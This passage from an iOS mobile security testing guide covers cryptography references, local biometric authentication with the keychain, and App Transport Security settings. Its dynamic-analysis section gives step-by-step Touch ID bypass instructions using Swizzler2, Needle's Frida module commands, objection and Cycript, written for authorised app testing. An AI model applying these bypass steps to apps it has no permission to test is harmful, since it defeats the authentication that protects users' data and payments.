  MSTG-CRYPTO-1: ``The app does not rely on symmetric cryptography with
  hardcoded keys as a sole method of encryption.''
\item
  MSTG-CRYPTO-2: ``The app uses proven implementations of cryptographic
  primitives.''
\item
  MSTG-CRYPTO-3: ``The app uses cryptographic primitives that are
  appropriate for the particular use-case, configured with parameters
  that adhere to industry best practices.''
\item
  MSTG-CRYPTO-5: ``The app doesn't re-use the same cryptographic key for
  multiple purposes.''
\item
  MSTG-CRYPTO-6: ``All random values are generated using a sufficiently
  secure random number generator.''
\end{itemize}

\hypertarget{general-security-documentation}{%
\paragraph{General Security
Documentation}\label{general-security-documentation}}

\begin{itemize}
\tightlist
\item
  Apple Developer Documentation on Security -
  \url{https://developer.apple.com/documentation/security}
\item
  Apple Security Guide -
  \url{https://www.apple.com/business/site/docs/iOS_Security_Guide.pdf}
\end{itemize}

\hypertarget{configuration-of-cryptographic-algorithms}{%
\paragraph{Configuration of Cryptographic
algorithms}\label{configuration-of-cryptographic-algorithms}}

\begin{itemize}
\tightlist
\item
  Apple's Cryptographic Services Guide -
  \url{https://developer.apple.com/library/content/documentation/Security/Conceptual/cryptoservices/GeneralPurposeCrypto/GeneralPurposeCrypto.html}
\item
  Apple Developer Documentation on randomization SecKey -
  \url{https://opensource.apple.com/source/Security/Security-57740.51.3/keychain/SecKey.h.auto.html}
\item
  Apple Documentation on Secure Enclave -
  \url{https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/storing_keys_in_the_secure_enclave?language=objc}
\item
  Source code of the header file -
  \url{https://opensource.apple.com/source/CommonCrypto/CommonCrypto-36064/CommonCrypto/CommonCryptor.h.auto.html}
\item
  GCM in CommonCrypto -
  \url{https://opensource.apple.com/source/CommonCrypto/CommonCrypto-60074/include/CommonCryptorSPI.h}
\item
  Apple Developer Documentation on SecKey -
  \url{https://opensource.apple.com/source/Security/Security-57740.51.3/keychain/SecKey.h.auto.html}
\item
  IDZSwiftCommonCrypto -
  \url{https://github.com/iosdevzone/IDZSwiftCommonCrypto}
\item
  Heimdall - \url{https://github.com/henrinormak/Heimdall}
\item
  SwiftyRSA - \url{https://github.com/TakeScoop/SwiftyRSA}
\item
  SwiftSSL - \url{https://github.com/SwiftP2P/SwiftSSL}
\item
  RNCryptor - \url{https://github.com/RNCryptor/RNCryptor}
\item
  Arcane - \url{https://github.com/onmyway133/Arcane}
\item
  CJOSE - \url{https://github.com/cisco/cjose}
\item
  CryptoSwift - \url{https://github.com/krzyzanowskim/CryptoSwift}
\item
  OpenSSL - \url{https://www.openssl.org/}
\item
  LibSodiums documentation -
  \url{https://download.libsodium.org/doc/installation}
\item
  Google on Tink -
  \url{https://security.googleblog.com/2018/08/introducing-tink-cryptographic-software.html}
\item
  Themis - \url{https://github.com/cossacklabs/themis}
\item
  cartfile -
  \url{https://github.com/Carthage/Carthage/blob/master/Documentation/Artifacts.md\#cartfile}
\item
  Podfile - \url{https://guides.cocoapods.org/syntax/podfile.html}
\end{itemize}

\hypertarget{random-number-documentation}{%
\paragraph{Random Number
Documentation}\label{random-number-documentation}}

\begin{itemize}
\tightlist
\item
  Apple Developer Documentation on randomization -
  \url{https://developer.apple.com/documentation/security/randomization_services}
\item
  Apple Developer Documentation on secrandomcopybytes -
  \url{https://developer.apple.com/reference/security/1399291-secrandomcopybytes}
\item
  Burp Suite Sequencer -
  \url{https://portswigger.net/burp/documentation/desktop/tools/sequencer}
\end{itemize}

\hypertarget{key-management}{%
\paragraph{Key Management}\label{key-management}}

\begin{itemize}
\tightlist
\item
  Apple Developer Documentation: Certificates and keys -
  \url{https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys}
\item
  Apple Developer Documentation: Generating new keys -
  \url{https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/generating_new_cryptographic_keys}
\item
  Apple Developer Documentation: Key generation attributes -
  \url{https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/key_generation_attributes}
\end{itemize}

\hypertarget{local-authentication-on-ios}{%
\subsection{Local Authentication on
iOS}\label{local-authentication-on-ios}}

During local authentication, an app authenticates the user against
credentials stored locally on the device. In other words, the user
``unlocks'' the app or some inner layer of functionality by providing a
valid PIN, password or biometric characteristics such as face or
fingerprint, which is verified by referencing local data. Generally,
this is done so that users can more conveniently resume an existing
session with a remote service or as a means of step-up authentication to
protect some critical function.

As stated before in chapter
``\href{0x04e-Testing-Authentication-and-Session-Management.md}{Mobile
App Authentication Architectures}'': The tester should be aware that
local authentication should always be enforced at a remote endpoint or
based on a cryptographic primitive. Attackers can easily bypass local
authentication if no data returns from the authentication process.

\hypertarget{testing-local-authentication-mstg-auth-8-and-mstg-storage-11}{%
\subsubsection{Testing Local Authentication (MSTG-AUTH-8 and
MSTG-STORAGE-11)}\label{testing-local-authentication-mstg-auth-8-and-mstg-storage-11}}

On iOS, a variety of methods are available for integrating local
authentication into apps. The
\href{https://developer.apple.com/documentation/localauthentication}{Local
Authentication framework} provides a set of APIs for developers to
extend an authentication dialog to a user. In the context of connecting
to a remote service, it is possible (and recommended) to leverage the
\href{https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html}{keychain}
for implementing local authentication.

Fingerprint authentication on iOS is known as \emph{Touch ID}. The
fingerprint ID sensor is operated by the
\href{https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf}{SecureEnclave
security coprocessor} and does not expose fingerprint data to any other
parts of the system. Next to Touch ID, Apple introduced \emph{Face ID}:
which allows authentication based on facial recognition. Both use
similar APIs on an application level, the actual method of storing the
data and retrieving the data (e.g.~facial data or fingerprint related
data is different).

Developers have two options for incorporating Touch ID/Face ID
authentication:

\begin{itemize}
\tightlist
\item
  \texttt{LocalAuthentication.framework} is a high-level API that can be
  used to authenticate the user via Touch ID. The app can't access any
  data associated with the enrolled fingerprint and is notified only
  whether authentication was successful.
\item
  \texttt{Security.framework} is a lower level API to access
  \href{https://developer.apple.com/documentation/security/keychain_services}{keychain
  services}. This is a secure option if your app needs to protect some
  secret data with biometric authentication, since the access control is
  managed on a system-level and can not easily be bypassed.
  \texttt{Security.framework} has a C API, but there are several
  \href{https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id}{open
  source wrappers available}, making access to the keychain as simple as
  to NSUserDefaults. \texttt{Security.framework} underlies
  \texttt{LocalAuthentication.framework}; Apple recommends to default to
  higher-level APIs whenever possible.
\end{itemize}

Please be aware that using either the
\texttt{LocalAuthentication.framework} or the
\texttt{Security.framework}, will be a control that can be bypassed by
an attacker as it does only return a boolean and no data to proceed
with. See \href{https://www.youtube.com/watch?v=XhXIHVGCFFM}{Don't touch
me that way, by David Lindner et al} for more details.

\hypertarget{local-authentication-framework}{%
\paragraph{Local Authentication
Framework}\label{local-authentication-framework}}

The Local Authentication framework provides facilities for requesting a
passphrase or Touch ID authentication from users. Developers can display
and utilize an authentication prompt by utilizing the function
\texttt{evaluatePolicy} of the \texttt{LAContext} class.

Two available policies define acceptable forms of authentication:

\begin{itemize}
\item
  \texttt{deviceOwnerAuthentication}(Swift) or
  \texttt{LAPolicyDeviceOwnerAuthentication}(Objective-C): When
  available, the user is prompted to perform Touch ID authentication. If
  Touch ID is not activated, the device passcode is requested instead.
  If the device passcode is not enabled, policy evaluation fails.
\item
  \texttt{deviceOwnerAuthenticationWithBiometrics} (Swift) or
  \texttt{LAPolicyDeviceOwnerAuthenticationWithBiometrics}(Objective-C):
  Authentication is restricted to biometrics where the user is prompted
  for Touch ID.
\end{itemize}

The \texttt{evaluatePolicy} function returns a boolean value indicating
whether the user has authenticated successfully.

The Apple Developer website offers code samples for both
\href{https://developer.apple.com/documentation/localauthentication}{Swift}
and
\href{https://developer.apple.com/documentation/localauthentication?language=objc}{Objective-C}.
A typical implementation in Swift looks as follows.

\begin{verbatim}
let context = LAContext()
var error: NSError?

guard context.canEvaluatePolicy(.deviceOwnerAuthentication, error: &error) else {
    // Could not evaluate policy; look at error and present an appropriate message to user
}

context.evaluatePolicy(.deviceOwnerAuthentication, localizedReason: "Please, pass authorization to enter this area") { success, evaluationError in
    guard success else {
        // User did not authenticate successfully, look at evaluationError and take appropriate action
    }

    // User authenticated successfully, take appropriate action
}
\end{verbatim}

\emph{Touch ID authentication in Swift using the Local Authentication
Framework (official code sample from Apple).}

\hypertarget{using-keychain-services-for-local-authentication}{%
\paragraph{Using Keychain Services for Local
Authentication}\label{using-keychain-services-for-local-authentication}}

The iOS keychain APIs can (and should) be used to implement local
authentication. During this process, the app stores either a secret
authentication token or another piece of secret data identifying the
user in the keychain. In order to authenticate to a remote service, the
user must unlock the keychain using their passphrase or fingerprint to
obtain the secret data.

The keychain allows saving items with the special
\texttt{SecAccessControl} attribute, which will allow access to the item
from the keychain only after the user has passed Touch ID authentication
(or passcode, if such a fallback is allowed by attribute parameters).

In the following example we will save the string
``test\_strong\_password'' to the keychain. The string can be accessed
only on the current device while the passcode is set
(\texttt{kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly} parameter) and
after Touch ID authentication for the currently enrolled fingers only
(\texttt{SecAccessControlCreateFlags.biometryCurrentSet} parameter):

\hypertarget{swift}{%
\subparagraph{Swift}\label{swift}}

\begin{verbatim}
// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
                                                          kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
                                                          SecAccessControlCreateFlags.biometryCurrentSet,
                                                          &error) else {
    // failed to create AccessControl object

    return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
    // successfully saved
} else {
    // error while saving
}
\end{verbatim}

\hypertarget{objective-c-1}{%
\subparagraph{Objective-C}\label{objective-c-1}}

\begin{verbatim}
    // 1. create AccessControl object that will represent authentication settings
    CFErrorRef *err = nil;

    SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
        kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
        kSecAccessControlUserPresence,
        err);

    // 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
    NSDictionary* query = @{
        (_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrLabel: @"com.me.myapp.password",
        (__bridge id)kSecAttrAccount: @"OWASP Account",
        (__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
        (__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
    };

    // 3. save item
    OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

    if (status == noErr) {
        // successfully saved
    } else {
        // error while saving
    }
\end{verbatim}

Now we can request the saved item from the keychain. Keychain services
will present the authentication dialog to the user and return data or
nil depending on whether a suitable fingerprint was provided or not.

\hypertarget{swift-1}{%
\subparagraph{Swift}\label{swift-1}}

\begin{verbatim}
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
    SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
    let password = String(data: queryResult as! Data, encoding: .utf8)!
    // successfully received password
} else {
    // authorization not passed
}
\end{verbatim}

\hypertarget{objective-c-2}{%
\subparagraph{Objective-C}\label{objective-c-2}}

\begin{verbatim}
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
    (__bridge id)kSecReturnData: @YES,
    (__bridge id)kSecAttrAccount: @"My Name1",
    (__bridge id)kSecAttrLabel: @"com.me.myapp.password",
    (__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
    NSData* resultData = ( __bridge_transfer NSData* )queryResult;
    NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
    NSLog(@"%@", password);
} else {
    NSLog(@"Something went wrong");
}
\end{verbatim}

Usage of frameworks in an app can also be detected by analyzing the app
binary's list of shared dynamic libraries. This can be done by using
otool:

\begin{verbatim}
$ otool -L <AppName>.app/<AppName>
\end{verbatim}

If \texttt{LocalAuthentication.framework} is used in an app, the output
will contain both of the following lines (remember that
\texttt{LocalAuthentication.framework} uses \texttt{Security.framework}
under the hood):

\begin{verbatim}
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
\end{verbatim}

If \texttt{Security.framework} is used, only the second one will be
shown.

\hypertarget{static-analysis-64}{%
\paragraph{Static Analysis}\label{static-analysis-64}}

It is important to remember that the LocalAuthentication framework is an
event-based procedure and as such, should not be the sole method of
authentication. Though this type of authentication is effective on the
user-interface level, it is easily bypassed through patching or
instrumentation. Therefore, it is best to use the keychain service
method, which means you should:

\begin{itemize}
\tightlist
\item
  Verify that sensitive processes, such as re-authenticating a user
  performing a payment transaction, are protected using the keychain
  services method.
\item
  Verify that access control flags are set for the keychain item which
  ensure that the keychain item its data can only be unlocked by means
  of authenticating the user. This can be with one of the following
  flags:

  \begin{itemize}
  \tightlist
  \item
    \texttt{kSecAccessControlBiometryCurrentSet} (before iOS 11.3
    \texttt{kSecAccessControlTouchIDCurrentSet}). This will make sure
    that a user needs to authenticate with biometrics (e.g.~Face ID or
    Touch ID) before accessing the data in the keychain item. Whenever
    the user adds a fingerprint or facial representation to the device,
    it will automatically invalidate the entry in the Keychain. This
    makes sure that the keychain item can only ever be unlocked by users
    that were enrolled when the item was added to the keychain.
  \item
    \texttt{kSecAccessControlBiometryAny} (before iOS 11.3
    \texttt{kSecAccessControlTouchIDAny}). This will make sure that a
    user needs to authenticate with biometrics (e.g.~Face ID or Touch
    ID) before accessing the data in the Keychain entry. The Keychain
    entry will survive any (re-)enroling of new fingerprints or facial
    representation. This can be very convenient if the user has a
    changing fingerprint. However, it also means that attackers, who are
    somehow able to enrole their fingerprints or facial representations
    to the device, can now access those entries as well.
  \item
    \texttt{kSecAccessControlUserPresence} can be used as an
    alternative. This will allow the user to authenticate himself
    through a passcode if the biometric authentication no longer works.
    This is considered to be weaker than
    \texttt{kSecAccessControlBiometryAny} since it is much easier to
    steal someone's passcode entry by means of shouldersurfing, than it
    is to bypass the Touch ID or Face ID service.
  \end{itemize}
\item
  In order to make sure that biometrics can be used, verify that the
  \texttt{kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly} or the
  \texttt{kSecAttrAccessibleWhenPasscodeSet} protection class is set
  when the \texttt{SecAccessControlCreateWithFlags} method is called.
  Note that the \texttt{...ThisDeviceOnly} variant will make sure that
  the keychain item is not synchronized with other iOS devices.
\end{itemize}

\begin{quote}
Note, a data protection class specifies the access methodology used to
secure the data. Each class uses different policies to determine when
the data is accessible.
\end{quote}

\hypertarget{dynamic-analysis-60}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-60}}

On a jailbroken device tools like
\href{https://github.com/vtky/Swizzler2}{Swizzler2} and
\href{https://github.com/mwrlabs/needle}{Needle} can be used to bypass
LocalAuthentication. Both tools use Frida to instrument the
\texttt{evaluatePolicy} function so that it returns \texttt{True} even
if authentication was not successfully performed. Follow the steps below
to activate this feature in Swizzler2:

\begin{itemize}
\tightlist
\item
  \textbf{Settings} -\textgreater{} \textbf{Swizzler}
\item
  Enable \textbf{Inject Swizzler into Apps}
\item
  Enable \textbf{Log Everything to Syslog}
\item
  Enable \textbf{Log Everything to File}
\item
  Enter the submenu \textbf{iOS Frameworks}
\item
  Enable \textbf{LocalAuthentication}
\item
  Enter the submenu \textbf{Select Target Apps}
\item
  Enable the target app
\item
  Close the app and start it again
\item
  When the Touch ID prompt shows click \textbf{cancel}
\item
  If the application flow continues without requiring the Touch ID then
  the bypass has worked.
\end{itemize}

If you're using Needle, run the
\texttt{hooking/frida/script\_touch-id-bypass} module and follow the
prompts. This will spawn the application and instrument the
\texttt{evaluatePolicy} function. When prompted to authenticate via
Touch ID, tap cancel. If the application flow continues, then you have
successfully bypassed Touch ID. A similar module
(hooking/cycript/cycript\_touchid) that uses Cycript instead of Frida is
also available in Needle.

Alternatively, you can use
\href{https://github.com/sensepost/objection/wiki/Understanding-the-Touch-ID-Bypass}{objection
to bypass Touch ID} (this also works on a non-jailbroken device), patch
the app, or use Cycript or similar tools to instrument the process.

Needle can be used to bypass insecure biometric authentication in iOS
platforms. Needle utilizes Frida to bypass login forms developed using
\texttt{LocalAuthentication.framework} APIs. The following module can be
used to test for insecure biometric authentication:

\begin{verbatim}
[needle][container] > use hooking/frida/script_touch-id-bypass
[needle][script_touch-id-bypass] > run
\end{verbatim}

If vulnerable, the module will automatically bypass the login form.

\hypertarget{note-regarding-temporariness-of-keys-in-the-keychain}{%
\subsubsection{Note regarding temporariness of keys in the
Keychain}\label{note-regarding-temporariness-of-keys-in-the-keychain}}

Unlike macOS and Android, iOS currently (at iOS 12) does not support
temporariness of an item's accessibility in the keychain: when there is
no additional security check when entering the keychain
(e.g.~\texttt{kSecAccessControlUserPresence} or similar is set), then
once the device is unlocked, a key will be accessible.

\hypertarget{references-20}{%
\subsubsection{References}\label{references-20}}

\hypertarget{owasp-masvs-15}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-15}}

\begin{itemize}
\tightlist
\item
  MSTG-AUTH-8: ``Biometric authentication, if any, is not event-bound
  (i.e.~using an API that simply returns''true" or ``false''). Instead,
  it is based on unlocking the keychain/keystore."
\item
  MSTG-STORAGE-11: ``The app enforces a minimum device-access-security
  policy, such as requiring the user to set a device passcode.''
\end{itemize}

\hypertarget{ios-network-apis}{%
\subsection{iOS Network APIs}\label{ios-network-apis}}

Almost every iOS app acts as a client to one or more remote services. As
this network communication usually takes place over untrusted networks
such as public Wi-Fi, classical network based-attacks become a potential
issue.

Most modern mobile apps use variants of HTTP-based web services, as
these protocols are well-documented and supported. Since iOS 12.0 the
\href{https://developer.apple.com/documentation/network}{Network
framework} and the
\href{https://developer.apple.com/documentation/foundation/urlsession}{\texttt{URLSession}}
class provide methods to load network and URL requests asynchronously
and synchronously. Older iOS versions can utilize the
\href{https://developer.apple.com/library/archive/documentation/NetworkingInternet/Conceptual/NetworkingTopics/Articles/UsingSocketsandSocketStreams.html}{Sockets
API}.

\hypertarget{network-framework}{%
\subsubsection{Network Framework}\label{network-framework}}

The Network framework was introduced at
\href{https://developer.apple.com/videos/play/wwdc2018/715}{The Apple
Worldwide Developers Conference (WWDC)} in 2018 and is a replacement to
the Sockets API. This low-level networking framework provides classes to
send and receive data with built in dynamic networking, security and
performance support.

TLS 1.3 is enabled by default in the Network framework, if the argument
\texttt{using:\ .tls} is used. It is the preferred option over the
legacy
\href{https://developer.apple.com/documentation/security/secure_transport}{Secure
Transport} framework.

\hypertarget{urlsession}{%
\subsubsection{URLSession}\label{urlsession}}

\texttt{URLSession} was built upon the Network framework and utilizes
the same transport services. The class also uses TLS 1.3 by default, if
the endpoint is HTTPS.

\texttt{URLSession} should be used for HTTP and HTTPS connections,
instead of utilizing the Network framework directly. The class natively
supports both URL schemes and is optimized for such connections. It
requires less boilerplate code, reducing the propensity for errors and
ensuring secure connections by default. The Network framework should
only be used when there are low-level and/or advanced networking
requirements.

The official Apple documentation includes examples of using the Network
framework to
\href{https://developer.apple.com/documentation/network/implementing_netcat_with_network_framework}{implement
netcat} and \texttt{URLSession} to
\href{https://developer.apple.com/documentation/foundation/url_loading_system/fetching_website_data_into_memory}{fetch
website data into memory}.

\hypertarget{app-transport-security-mstg-network-2}{%
\subsubsection{App Transport Security
(MSTG-NETWORK-2)}\label{app-transport-security-mstg-network-2}}

\hypertarget{overview-57}{%
\paragraph{Overview}\label{overview-57}}

\href{https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html}{App
Transport Security (ATS)} is a set of security checks that the operating
system enforces when making connections with
\href{https://developer.apple.com/reference/foundation/nsurlconnection}{NSURLConnection},~\href{https://developer.apple.com/reference/foundation/urlsession}{NSURLSession}
and~\href{https://developer.apple.com/reference/corefoundation/cfurl-rd7}{CFURL}
to public hostnames. ATS is enabled by default for applications build on
iOS SDK 9 and above.

ATS is enforced only when making connections to public hostnames.
Therefore any connection made to an IP address, unqualified domain names
or TLD of .local is not protected with ATS.

The following is a summarized list of
\href{https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html}{App
Transport Security Requirements}:

\begin{itemize}
\tightlist
\item
  No HTTP connections are allowed
\item
  The X.509 Certificate has a SHA256 fingerprint and must be signed with
  at least a 2048-bit RSA key or a 256-bit Elliptic-Curve Cryptography
  (ECC) key.
\item
  Transport Layer Security (TLS) version must be 1.2 or above and must
  support Perfect Forward Secrecy (PFS) through Elliptic Curve
  Diffie-Hellman Ephemeral (ECDHE) key exchange and AES-128 or AES-256
  symmetric ciphers.
\end{itemize}

The cipher suite must be one of the following:

\begin{itemize}
\tightlist
\item
  \texttt{TLS\_ECDHE\_ECDSA\_WITH\_AES\_256\_GCM\_SHA384}
\item
  \texttt{TLS\_ECDHE\_ECDSA\_WITH\_AES\_128\_GCM\_SHA256}
\item
  \texttt{TLS\_ECDHE\_ECDSA\_WITH\_AES\_256\_CBC\_SHA384}
\item
  \texttt{TLS\_ECDHE\_ECDSA\_WITH\_AES\_256\_CBC\_SHA}
\item
  \texttt{TLS\_ECDHE\_ECDSA\_WITH\_AES\_128\_CBC\_SHA256}
\item
  \texttt{TLS\_ECDHE\_ECDSA\_WITH\_AES\_128\_CBC\_SHA}
\item
  \texttt{TLS\_ECDHE\_RSA\_WITH\_AES\_256\_GCM\_SHA384}
\item
  \texttt{TLS\_ECDHE\_RSA\_WITH\_AES\_128\_GCM\_SHA256}
\item
  \texttt{TLS\_ECDHE\_RSA\_WITH\_AES\_256\_CBC\_SHA384}
\item
  \texttt{TLS\_ECDHE\_RSA\_WITH\_AES\_128\_CBC\_SHA256}
\item
  \texttt{TLS\_ECDHE\_RSA\_WITH\_AES\_128\_CBC\_SHA}
\end{itemize}

\hypertarget{ats-exceptions}{%
\subparagraph{ATS Exceptions}\label{ats-exceptions}}

ATS restrictions can be disabled by configuring exceptions in the
Info.plist file under the \texttt{NSAppTransportSecurity} key. These
exceptions can be applied to:

\begin{itemize}
\tightlist
\item
  allow insecure connections (HTTP),
\item
  lower the minimum TLS version,
\item
  disable PFS or
\item
  allow connections to local domains.
\end{itemize}

ATS exceptions can be applied globally or per domain basis. The
application can globally disable ATS, but opt in for individual domains.
The following listing from Apple Developer documentation shows the
structure of the
\texttt{{[}NSAppTransportSecurity{]}(https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html\#//apple\_ref/doc/plist/info/NSAppTransportSecurity\ "API\ Reference\ NSAppTransportSecurity")}
dictionary.

\begin{verbatim}
NSAppTransportSecurity : Dictionary {
    NSAllowsArbitraryLoads : Boolean
    NSAllowsArbitraryLoadsForMedia : Boolean
    NSAllowsArbitraryLoadsInWebContent : Boolean
    NSAllowsLocalNetworking : Boolean
    NSExceptionDomains : Dictionary {
        <domain-name-string> : Dictionary {
            NSIncludesSubdomains : Boolean
            NSExceptionAllowsInsecureHTTPLoads : Boolean
            NSExceptionMinimumTLSVersion : String
            NSExceptionRequiresForwardSecrecy : Boolean   // Default value is YES
            NSRequiresCertificateTransparency : Boolean
        }
    }
}
\end{verbatim}

Source:
\href{https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html}{Apple
Developer Documentation}.

The following table summarizes the global ATS exceptions. For more
information about these exceptions, please refer to
\href{https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html\#//apple_ref/doc/uid/TP40009251-SW34}{table
2 in the official Apple developer documentation}.

\begin{longtable}[]{@{}ll@{}}
\toprule
\begin{minipage}[b]{0.28\columnwidth}\raggedright
Key\strut
\end{minipage} & \begin{minipage}[b]{0.66\columnwidth}\raggedright
Description\strut
\end{minipage}\tabularnewline
\midrule
\endhead
\begin{minipage}[t]{0.28\columnwidth}\raggedright
\texttt{NSAllowsArbitraryLoads}\strut
\end{minipage} & \begin{minipage}[t]{0.66\columnwidth}\raggedright
Disable ATS restrictions globally excepts for individual domains
specified under \texttt{NSExceptionDomains}\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.28\columnwidth}\raggedright
\texttt{NSAllowsArbitraryLoadsInWebContent}\strut
\end{minipage} & \begin{minipage}[t]{0.66\columnwidth}\raggedright
Disable ATS restrictions for all the connections made from web
views\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.28\columnwidth}\raggedright
\texttt{NSAllowsLocalNetworking}\strut
\end{minipage} & \begin{minipage}[t]{0.66\columnwidth}\raggedright
Allow connection to unqualified domain names and .local domains\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.28\columnwidth}\raggedright
\texttt{NSAllowsArbitraryLoadsForMedia}\strut
\end{minipage} & \begin{minipage}[t]{0.66\columnwidth}\raggedright
Disable all ATS restrictions for media loaded through the AV Foundations
framework\strut
\end{minipage}\tabularnewline
\bottomrule
\end{longtable}

The following table summarizes the per-domain ATS exceptions. For more
information about these exceptions, please refer to
\href{https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html\#//apple_ref/doc/uid/TP40009251-SW44}{table
3 in the official Apple developer documentation}.

\begin{longtable}[]{@{}ll@{}}
\toprule
\begin{minipage}[b]{0.28\columnwidth}\raggedright
Key\strut
\end{minipage} & \begin{minipage}[b]{0.66\columnwidth}\raggedright
Description\strut
\end{minipage}\tabularnewline
\midrule
\endhead
\begin{minipage}[t]{0.28\columnwidth}\raggedright
\texttt{NSIncludesSubdomains}\strut
\end{minipage} & \begin{minipage}[t]{0.66\columnwidth}\raggedright
Indicates whether ATS exceptions should apply to subdomains of the named
domain\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.28\columnwidth}\raggedright
\texttt{NSExceptionAllowsInsecureHTTPLoads}\strut
\end{minipage} & \begin{minipage}[t]{0.66\columnwidth}\raggedright
Allows HTTP connections to the named domain, but does not affect TLS
requirements\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.28\columnwidth}\raggedright
\texttt{NSExceptionMinimumTLSVersion}\strut
\end{minipage} & \begin{minipage}[t]{0.66\columnwidth}\raggedright
Allows connections to servers with TLS versions less than 1.2\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.28\columnwidth}\raggedright
\texttt{NSExceptionRequiresForwardSecrecy}\strut
\end{minipage} & \begin{minipage}[t]{0.66\columnwidth}\raggedright
Disable perfect forward secrecy (PFS)\strut
\end{minipage}\tabularnewline
\bottomrule
\end{longtable}

Starting from January 1 2017, Apple App Store review requires
justification if one of the following ATS exceptions are defined.

\begin{itemize}
\tightlist
\item
  \texttt{NSAllowsArbitraryLoads}
\item
  \texttt{NSAllowsArbitraryLoadsForMedia}
\item
  \texttt{NSAllowsArbitraryLoadsInWebContent}
\item
  \texttt{NSExceptionAllowsInsecureHTTPLoads}
\item
  \texttt{NSExceptionMinimumTLSVersion}
\end{itemize}

However this decline is extended later by Apple stating
\href{https://developer.apple.com/news/?id=12212016b}{``To give you
additional time to prepare, this deadline has been extended and we will
provide another update when a new deadline is confirmed''}

\hypertarget{analyzing-the-ats-configuration}{%
\paragraph{Analyzing the ATS
Configuration}\label{analyzing-the-ats-configuration}}

If the source code is available, open then \texttt{Info.plist} file in
the application bundle directory and look for any exceptions that the
application developer has configured. This file should be examined
taking the applications context into consideration.

The following listing is an example of an exception configured to
disable ATS restrictions globally.

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{<key>}\NormalTok{NSAppTransportSecurity}\KeywordTok{</key>}
    \KeywordTok{<dict>}
        \KeywordTok{<key>}\NormalTok{NSAllowsArbitraryLoads}\KeywordTok{</key>}
        \KeywordTok{<true/>}
    \KeywordTok{</dict>}
\end{Highlighting}
\end{Shaded}

If the source code is not available, then the \texttt{Info.plist} file
should be either obtained from a jailbroken device or by extracting the
application IPA file. Convert it to a human readable format if needed
(e.g.~\texttt{plutil\ -convert\ xml1\ Info.plist}) as explained in the
chapter ``iOS Basic Security Testing'', section ``The Info.plist File''.

The application may have ATS exceptions defined to allow it's normal
functionality. For an example, the Firefox iOS application has ATS
disabled globally. This exception is acceptable because otherwise the
application would not be able to connect to any HTTP website that does
not have all the ATS requirements.

\hypertarget{recommendations-for-usage-of-ats}{%
\paragraph{Recommendations for usage of
ATS}\label{recommendations-for-usage-of-ats}}

It is possible to verify which ATS settings can be used when
communicating to a certain endpoint. On macOS the command line utility
\texttt{nscurl} is available to check the same. The command can be used
as follows:

\begin{verbatim}
/usr/bin/nscurl --ats-diagnostics https://www.example.com
Starting ATS Diagnostics

Configuring ATS Info.plist keys and displaying the result of HTTPS loads to https://www.example.com.
A test will "PASS" if URLSession:task:didCompleteWithError: returns a nil error.
